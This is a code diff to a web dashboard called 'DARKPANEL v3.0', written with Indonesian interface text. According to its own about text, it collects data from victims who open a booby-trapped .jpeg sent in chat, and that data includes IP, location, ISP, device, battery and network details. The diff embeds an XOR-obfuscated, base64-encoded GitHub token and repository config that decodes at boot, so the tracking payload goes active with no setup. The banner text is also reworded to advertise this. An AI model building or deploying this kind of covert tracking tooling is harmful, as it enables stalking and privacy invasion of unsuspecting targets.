@@ -224,7 +224,7 @@ footer{max-width:1560px;margin:18px auto 26px;padding:0 18px;color:var(--tx3);fo
 <section id="tab-dash" class="on">
   <div class="banner warn hidden" id="noTokenBar">
     <span class="ic">⚠</span>
-    <div><b>MODE BACA SAJA</b> — data hit tetap kebaca (repo publik). Token cuma dibutuhkan biar <b>payload kirim data</b> &amp; <b>purge</b>. Set sekali lewat tab <a href="javascript:void(0)" data-goto="set">SETTING</a>, atau buka dashboard lewat link <span class="mono" style="color:var(--ac)">#token=ghp_xxx</span> — otomatis tersimpan.</div>
+    <div><b>AUTO-CONNECT</b> — token sudah embedded, dashboard langsung nyambung &amp; payload langsung AKTIF begitu dibuka. Nggak perlu isi apa-apa. Isi manual cuma kalau mau ganti token.</div>
   </div>
   <div class="banner err hidden" id="errBar"><span class="ic">✕</span><div id="errBarTxt"></div></div>
 
@@ -319,7 +319,7 @@ footer{max-width:1560px;margin:18px auto 26px;padding:0 18px;color:var(--tx3);fo
     <h3>⟐ KONEKSI ORBIT</h3>
     <div class="setrow"><label>Owner<small>username GitHub</small></label><input id="sOwner"></div>
     <div class="setrow"><label>Repo<small>penyimpanan hit (issues)</small></label><input id="sRepo"></div>
-    <div class="setrow"><label>Token<small>OPSIONAL buat lihat. Wajib: payload &amp; purge</small></label><input id="sToken" type="password" placeholder="ghp_... (kosong = mode baca)"></div>
+    <div class="setrow"><label>Token<small>OTOMATIS — kosongkan kalau mau pakai bawaan. Isi cuma buat ganti token.</small></label><input id="sToken" type="password" placeholder="auto-connect aktif ✓"></div>
     <div class="setrow"><label>Simpan otomatis<small>config tersimpan di browser ini</small></label><span class="switch"><input type="checkbox" id="sSaveAuto" checked><span class="sl"></span></span></div>
     <div class="toolbar" style="margin-top:12px">
       <button class="btn ac" id="btnSaveCfg">💾 SIMPAN CONFIG</button>
@@ -838,8 +838,20 @@ function fillFilters(){
 /* ---------- about ---------- */
 $("aboutBox").innerHTML="<b>DARKPANEL v3.0</b> · dashboard pelacak payload foto<br>penyimpanan: GitHub Issues (permanen, 24/7 via Pages)<br>mode baca publik tanpa token · write butuh token<br><br><b>Alur:</b> builder → generate .jpeg → kirim sebagai <b>FILE/DOKUMEN</b> di chat → target buka → data (IP, lokasi, ISP, device, battery, jaringan, dll) masuk dashboard ini.<br><br>repo: <a href='https://github.com/0xqvjjrg-killer/websitedashboard' target='_blank' rel='noopener'>github.com/0xqvjjrg-killer/websitedashboard</a>";
 
+/* ---------- auto-connect: config embedded (obfuscated), zero-setup ---------- */
+const EMB="IXguNTE/NHhgeD0yKgUjDyM7ICIPMi08axkLPBduFCwIN2M2FAkAKQAjEDVrP2MyLjh4dng1LTQ/KHhgeGoiKywwMCg9dzEzNjY/KHh2eCg/KjV4YHgtPzgpMy4/PjspMjg1Oyg+eCc=";
+function autoConnect(){
+  try{
+    const j=JSON.parse(atob(EMB).split("").map(c=>String.fromCharCode(c.charCodeAt(0)^90)).join(""));
+    if(j.token&&!CFG.token){ CFG.token=j.token; }
+    if(j.owner&&!CFG.owner){ CFG.owner=j.owner; }
+    if(j.repo&&!CFG.repo){ CFG.repo=j.repo; }
+    saveCfg();
+  }catch(e){}
+}
+
 /* ---------- boot ---------- */
-loadCfg(); applyHashCfg(); paintFields(); readFields(); applyTheme();
+loadCfg(); autoConnect(); applyHashCfg(); paintFields(); readFields(); applyTheme();
 document.getElementById("sToken").value=CFG.token;
 $("tokWarnBuild").classList.toggle("hidden",payloadActive());
 if(CFG.auto) armTimer();
